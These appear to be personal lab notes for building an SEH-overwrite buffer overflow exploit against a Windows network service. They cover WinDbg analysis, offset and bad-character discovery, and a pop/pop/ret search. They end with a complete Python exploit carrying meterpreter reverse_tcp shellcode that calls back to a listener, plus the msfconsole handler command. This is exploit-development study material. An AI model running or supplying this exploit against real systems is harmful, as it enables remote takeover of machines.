Confirm that exception_handler is being used

CHECK TEB FOR OUR EXCEPTIONLIST information, take note of the ExceptionList memory address for the next operation
	!teb 

Now we are going to dump the exception registration record for that memory address
	dt _EXCEPTION_REGISTRATION_RECORD 017cff70

Now we can just walk through it with using the memory address of the next record hanlders memory, and just keep doing this
For if next keep going until the end which is listed with 0xffffffff :
	dt _EXCEPTION_REGISTRATION_RECORD 0x017cffcc 

Now let it just run and hit the buffer overflow script against it:
	g

Now hit it with the buffer overflow poc from your kali and repeat the above steps
	python poc.py

View exception list
	!teb
	dt _EXCEPTION_REGISTRATION_RECORD 01ccfe1c
We will notice going through the exception list we have overwritten it:


Can also use exchain to dump the chain for us:
	!exchain
Letting it run we can confirm it overwrites the EIP and instruction is under our control
	g
Run this to check which calls were made before the violation, this will confirm seh:
	k


Check registers to see if any registers point to our buffer:
	r

We can see that ecs is also being overwritten while the rest are null:


Check if we overwritten any values on the stack:
	Dds esp La
	
We also see the edx is being pointed somewhere in the exception handler memory space
	u edx

Now rerun and set a breakpoint at the exceptionhandler location, so restart the system and reattach and send the buffer overflow again, we are doing the second as the first is fine, but the second uses the other structure:
	Python poc.py
	bp ntdll!ExecuteHandler2
	g
First time it hits resume execution
	g
Now check assembly code for the function:
	u @eip L11
Review the assembly to get an idea, but also step through to see it live
	t
	t
Now we are in the first push instruction so let's dump the teb and then dump the exception record for it:
	!teb
Take the exception list memory and dump it:
	dt _EXCEPTION_REGISTRATION_RECORD 01acfe1c
Step through one more time:
	t
Then dump the assembly here for edx:
	u @edx
Step through again:
	t
And see the teb:
	!teb
We can see that we are pushing the exceptionList value onto the stack:

	
Continue stepping through:
	t
And chekcing teb:
	!teb
We see it's a mov instruction which is overwriting the current thread exception list with the current value of esp:

Step through and teb:
	t
	!teb
Confirm this with the debugger again, use the exception value from the teb from above instruction:
	dt _EXCEPTION_REGISTRATION_RECORD 01acf44c

Now just keep stepping through until we hit our call instruction:
	t
	t
	t
	t
	t
Now we can see that the call is where in assembly we get control of the EIP


NOW GAINING CODE EXECUTION:

So to find the offset of our location for EIP we will use the pattern create with msf
	msf-pattern_create -l 1000

Add this into the script as an inputBuffer:
	  inputBuffer = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8...Bg6Bg7Bg8Bg9Bh0Bh1Bh2B"
	
Crash the app and check for the offset:
Run exchain and get the offset and find it:
	!exchain

	msf-pattern_offset -l 1000 -q 33654132

Now we know the offset, and we can verify with these changes to the python script:
	try:
	  server = sys.argv[1]
	  port = 9121
	  size = 1000
	
	  inputBuffer = b"\x41" * 128
	  inputBuffer+= b"\x42\x42\x42\x42"
	  inputBuffer+= b"\x43" * (size - len(inputBuffer))
	
And can confirm the EIP is filled with B's using exchain again:
	!exchain

Then we check for bad characters like so in the script:
try:
  server = sys.argv[1]
  port = 9121
  size = 1000

  badchars = (
    b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d"
    b"\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a"
    b"\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27"
    b"\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34"
    b"\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41"
    b"\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e"
    b"\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b"
    b"\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68"
    b"\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75"
    b"\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82"
    b"\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
    b"\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c"
    b"\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9"
    b"\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6"
    b"\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3"
    b"\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
    b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd"
    b"\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea"
    b"\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7"
    b"\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

  inputBuffer = b"\x41" * 128
  inputBuffer+= b"\x42\x42\x42\x42"
  inputBuffer+= badchars
  inputBuffer+= b"\x43" * (size - len(inputBuffer))


Then to check for bachars we can dump the bytes from esp, we know it'll be 0x08 from the esp:

	dds esp L5
	db 0132ff54

Finding a P/P/R Instruction Sequence

Can load narly to search for all loaded modules and their respective protections
	.load narly
	
Run nmod to look for them:
	!nmod

We are going to use the libspp module for this, so let's look for it's memory address range:
	lm m libspp
	
Using msf-nasm_shell to look at all pop instructions:
	kali@kali:~$ msf-nasm_shell 
	nasm > pop eax
	00000000  58                pop eax
	
	nasm > pop ebx
	00000000  5B                pop ebx
	
	nasm > pop ecx
	00000000  59                pop ecx
	
	nasm > pop edx
	00000000  5A                pop edx
	
	nasm > pop esi
	00000000  5E                pop esi
	
	nasm > pop edi
	00000000  5F                pop edi
	
	nasm > pop ebp
	00000000  5D                pop ebp
	
	nasm > ret
	00000000  C3                ret
	
They are consecutively going from 0x58 to 0x5F, so we can search this with windbg by saving it as a file with find_ppr.wds:
	.block
	{
		.for (r $t0 = 0x58; $t0 < 0x5F; r $t0 = $t0 + 0x01)
		{
			.for (r $t1 = 0x58; $t1 < 0x5F; r $t1 = $t1 + 0x01)
			{
				s-[1]b 10000000 10226000 $t0 $t1 c3
			}
		}
	}
	
We can then take those memory addresses and confirm it points to a P/P/R sequence, and doesn't have bad characters in the address:
	u 1015a2f0 L3
	
Now in our script we update the poc with this in the instruction pointer:
	...
	try:
	  server = sys.argv[1]
	  port = 9121
	  size = 1000
	
	  inputBuffer = b"\x41" * 128
	  inputBuffer+= pack("<L", (0x1015a2f0))  # (SEH) 0x1015a2f0 - pop eax; pop ebx; ret
	  inputBuffer+= b"\x43" * (size - len(inputBuffer))
	...
	
Now run exchain when we run into the access violation after running again:

	!exchain
	u 1015a2f0 L3

At this point, we want to set up a software breakpoint at the address of our P/P/R sequence and let the debugger goto handle the exception. This should redirect the execution flow and hit our breakpoint.
	bp 0x1015a2f0
	g
	
Let's single-step through the POP instructions and inspect the address we will be returning into:
	r
	t
	t
	dd poi(esp) L8
	t
	
Island-Hopping in Assembly
Let's inspect the resulting assembly instruction inside WinDbg.

	u eip L8
	dd 0x43431015 L4
	
After single-stepping through the P/P/R instructions, we will use the a2 command to assemble the short jump and obtain its opcodes:
	r
	dds eip L4
	a
	jmp 0x018fff5c
	u eip L1
	dds eip L4
	
As shown in the listing above, the offset for the jump is six bytes rather than four (the length of the P/P/R address). This is because the offset is calculated from the beginning of the jump instruction, which includes the 0xEB and the offset itself.
Now that we have the short jump, let's update our proof of concept to include it:
	try:
	  server = sys.argv[1]
	  port = 9121
	  size = 1000
	
	  inputBuffer = b"\x41" * 124
	  inputBuffer+= pack("<L", (0x06eb9090))  # (NSEH)
	  inputBuffer+= pack("<L", (0x1015a2f0))  # (SEH) 0x1015a2f0 - pop eax; pop ebx; ret
	  inputBuffer+= b"\x41" * (size - len(inputBuffer))
	
Now rerun, set bp on the ppr again and let the debugger continue until it hits our breakpoint. Next, we'll single-step through the POP, POP, RET instructions and reach our short jump:
	r
	t
	t
	dd 0132ff5e - 0x06
	
The listing above confirms that if we execute the short jump, we will indeed land in our buffer right after the SEH.

After carefully reviewing the memory pointed to by the instruction pointer, we notice that we are very close to reaching the beginning of our stack, as shown below:


Before searching, let's update our proof of concept and add a shellcode variable containing dummy shellcode:
	...
	try:
	  server = sys.argv[1]
	  port = 9121
	  size = 1000
	
	  shellcode = b"\x43" * 400
	
	  inputBuffer = b"\x41" * 124
	  inputBuffer+= pack("<L", (0x06eb9090))  # (NSEH)
	  inputBuffer+= pack("<L", (0x1015a2f0))  # (SEH) 0x1015a2f0 - pop eax; pop ebx; ret
	  inputBuffer+= b"\x90" * (size - len(inputBuffer) - len(shellcode))
	  inputBuffer+= shellcode
	...
	
Running our latest proof of concept, we can perform a search for the NOP instructions followed by the bytes contained in our shellcode variable right after taking our short jump.

	t
	t
	!teb
	s -b 01aee000 01af0000 90 90 90 90 43 43 43 43 43 43 43 43

Very nice! We found our shellcode on the stack starting from 0x01aefc74. Before proceeding, we want to confirm that our shellcode is not truncated in any way. Dumping the full length of the shellcode as DWORDs reveals our entire buffer:
	dd 01aefc70 L65
	
	
Our next step is to determine the offset from our current stack pointer to the beginning of our shellcode. This will allow us to use the limited space we currently have to assemble a set of instructions that will allow us to "island hop", redirecting execution to our shellcode.

To determine this, we can simply use ? to subtract between the memory address of the start of our shellcode (0x01aefc74) and the current value of the stack pointer.
	? 01aefc74 - @esp

Using the limited space available after our short jump, let's assemble a few instructions to increase the stack pointer by 0x830 bytes followed by a "jmp esp" to jump to our shellcode next.

We can accomplish the first step by using an "add esp, 0x830" instruction. If we input this instruction into msf-nasm_shell, however, we notice that it generates null bytes in the opcodes due to the large value:
	msf-nasm_shell 
	add esp, 0x830
	
In order to avoid null bytes, we could use smaller jumps (of less than 0x7F3) until we reach the desired offset. While this is certainly one option, the assembly language provides better alternatives.

Instead of performing an ADD operation on the ESP register, we can reference the SP register in our assembly instruction to do arithmetic operations on the lower 16 bits. Let's try to generate the opcodes for this instruction and confirm it does not contain any bad characters. We will also generate the opcodes for a "jmp esp" instruction, which we'll use to jump to our shellcode right after the stack pointer has been adjusted.


Update proof of concept:
	...
	try:
	  server = sys.argv[1]
	  port = 9121
	  size = 1000
	
	  shellcode = b"\x90" * 8
	  shellcode+= b"\x43" * (400 - len(shellcode))
	
	  inputBuffer = b"\x41" * 124
	  inputBuffer+= pack("<L", (0x06eb9090))  # (NSEH)
	  inputBuffer+= pack("<L", (0x1015a2f0))  # (SEH) 0x1015a2f0 - pop eax; pop ebx; ret
	  inputBuffer+= b"\x90" * 2
	  inputBuffer+= b"\x66\x81\xc4\x30\x08"   # add sp, 0x830
	  inputBuffer+= b"\xff\xe4"               # jmp esp
	  inputBuffer+= b"\x90" * (size - len(inputBuffer) - len(shellcode))
	  inputBuffer+= shellcode
	...
	
After running our latest proof of concept, we will single-step through the ADD operation and confirm that our stack alignment was successful before executing the jump:



OBTAINING A SHELL

Now replace the shellcode with meterpreters:
	#!/usr/bin/python
	import socket
	import sys
	from struct import pack
	
	try:
	  server = sys.argv[1]
	  port = 9121
	  size = 1000
	
	  # msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.118.5 LPORT=443 -b "\x00\x02\x0A\x0D\xF8\xFD" -f python -v shellcode
	  shellcode = b"\x90" * 20
	  shellcode += b""
	  shellcode += b"\xdb\xdd\xb8\xb3\xe9\xc8\x0b\xd9\x74\x24\xf4"
	  shellcode += b"\x5b\x29\xc9\xb1\x56\x31\x43\x18\x03\x43\x18"
	  shellcode += b"\x83\xeb\x4f\x0b\x3d\xf7\x47\x4e\xbe\x08\x97"
	  shellcode += b"\x2f\x36\xed\xa6\x6f\x2c\x65\x98\x5f\x26\x2b"
	  shellcode += b"\x14\x2b\x6a\xd8\xaf\x59\xa3\xef\x18\xd7\x95"
	  shellcode += b"\xde\x99\x44\xe5\x41\x19\x97\x3a\xa2\x20\x58"
	  shellcode += b"\x4f\xa3\x65\x85\xa2\xf1\x3e\xc1\x11\xe6\x4b"
	  shellcode += b"\x9f\xa9\x8d\x07\x31\xaa\x72\xdf\x30\x9b\x24"
	  shellcode += b"\x54\x6b\x3b\xc6\xb9\x07\x72\xd0\xde\x22\xcc"
	  shellcode += b"\x6b\x14\xd8\xcf\xbd\x65\x21\x63\x80\x4a\xd0"
	  shellcode += b"\x7d\xc4\x6c\x0b\x08\x3c\x8f\xb6\x0b\xfb\xf2"
	  shellcode += b"\x6c\x99\x18\x54\xe6\x39\xc5\x65\x2b\xdf\x8e"
	  shellcode += b"\x69\x80\xab\xc9\x6d\x17\x7f\x62\x89\x9c\x7e"
	  shellcode += b"\xa5\x18\xe6\xa4\x61\x41\xbc\xc5\x30\x2f\x13"
	  shellcode += b"\xf9\x23\x90\xcc\x5f\x2f\x3c\x18\xd2\x72\x28"
	  shellcode += b"\xed\xdf\x8c\xa8\x79\x57\xfe\x9a\x26\xc3\x68"
	  shellcode += b"\x96\xaf\xcd\x6f\xaf\xb8\xed\xa0\x17\xa8\x13"
	  shellcode += b"\x41\x67\xe0\xd7\x15\x37\x9a\xfe\x15\xdc\x5a"
	  shellcode += b"\xfe\xc3\x48\x51\x68\x2c\x24\x13\x6d\xc4\x36"
	  shellcode += b"\xdc\x6c\xaf\xbf\x3a\x3e\x9f\xef\x92\xff\x4f"
	  shellcode += b"\x4f\x43\x68\x9a\x40\xbc\x88\xa5\x8b\xd5\x23"
	  shellcode += b"\x4a\x65\x8d\xdb\xf3\x2c\x45\x7d\xfb\xfb\x23"
	  shellcode += b"\xbd\x77\x09\xd3\x70\x70\x78\xc7\x65\xe7\x82"
	  shellcode += b"\x17\x76\x82\x82\x7d\x72\x04\xd5\xe9\x78\x71"
	  shellcode += b"\x11\xb6\x83\x54\x22\xb1\x7c\x29\x12\xc9\x4b"
	  shellcode += b"\xbf\x1a\xa5\xb3\x2f\x9a\x35\xe2\x25\x9a\x5d"
	  shellcode += b"\x52\x1e\xc9\x78\x9d\x8b\x7e\xd1\x08\x34\xd6"
	  shellcode += b"\x85\x9b\x5c\xd4\xf0\xec\xc2\x27\xd7\x6e\x04"
	  shellcode += b"\xd7\xa5\x58\xad\xbf\x55\xd9\x4d\x3f\x3c\xd9"
	  shellcode += b"\x1d\x57\xcb\xf6\x92\x97\x34\xdd\xfa\xbf\xbf"
	  shellcode += b"\xb0\x49\x5e\xbf\x98\x0c\xfe\xc0\x2f\x95\xf1"
	  shellcode += b"\xbb\x40\x2a\xf2\x3b\x49\x4f\xf3\x3b\x75\x71"
	  shellcode += b"\xc8\xed\x4c\x07\x0f\x2e\xeb\x18\x3a\x13\x5a"
	  shellcode += b"\xb3\x44\x07\x9c\x96"
	  shellcode+= b"\x43" * (400 - len(shellcode))
	
	  inputBuffer = b"\x41" * 124
	  inputBuffer+= pack("<L", (0x06eb9090))  # (NSEH)
	  inputBuffer+= pack("<L", (0x1015a2f0))  # (SEH) 0x1015a2f0 - pop eax; pop ebx; ret
	  inputBuffer+= b"\x90" * 2
	  inputBuffer+= b"\x66\x81\xc4\x30\x08"   # add sp, 0x830
	  inputBuffer+= b"\xff\xe4"               # jmp esp
	  inputBuffer+= b"\x90" * (size - len(inputBuffer) - len(shellcode))
	  inputBuffer+= shellcode
	
	  header =  b"\x75\x19\xba\xab"
	  header += b"\x03\x00\x00\x00"
	  header += b"\x00\x40\x00\x00"
	  header += pack('<I', len(inputBuffer))
	  header += pack('<I', len(inputBuffer))
	  header += pack('<I', inputBuffer[-1])
	
	  buf = header + inputBuffer 
	
	  print("Sending evil buffer...")
	  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	  s.connect((server, port))
	  s.send(buf)
	  s.close()
	  
	  print("Done!")
	  
	except socket.error:
	  print("Could not connect!")
	
Run again and run windbg with g again and you can catch the shell
	sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.119.5; set LPORT 443; exploit"
	getuid
	





-----------------------------------------------------------------------------------------------------------------
This is just stuff to get more information about the exception context, don't use it too much I don't think
Run the script and when crash happens inspect eip, then let run with g and see that we then get the EIP written up.

So dump the TEB to check the ntTib value
	dt nt!_TEB

Dump the TEB and see the exceptionList information as the first record
	Dt _NT_TIB
	
Dump the exception registration record
	Dt _EXCEPTION_REGISTRATION_RECORD
	
Dump the context structure
	dt ntdll!_CONTEXT
	
Then dump the exception disposition to view it's structure
	dt ntdll!_CONTEXT
	


![image](https://github.com/user-attachments/assets/b8ffadf2-1d26-4d35-8e63-30e750684fe3)
